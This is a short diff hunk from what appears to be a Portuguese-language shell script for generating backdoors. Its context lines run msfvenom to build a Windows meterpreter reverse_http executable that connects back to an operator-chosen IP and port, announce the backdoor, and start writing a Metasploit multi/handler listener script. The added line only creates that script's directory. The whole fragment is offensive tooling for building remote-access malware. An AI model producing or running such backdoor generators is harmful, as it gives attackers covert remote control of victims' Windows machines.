@@ -392,6 +392,7 @@ then
 					$msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "Backdoor $nome gerado em $caminho/$nome.exe"
+					mkdir -p ~/Backdoor-apk/.WinB
 					cd $HOME/Backdoor-apk/.WinB
 					cat > WinB-http.rb <<- EOF
 					use exploit/multi/handler
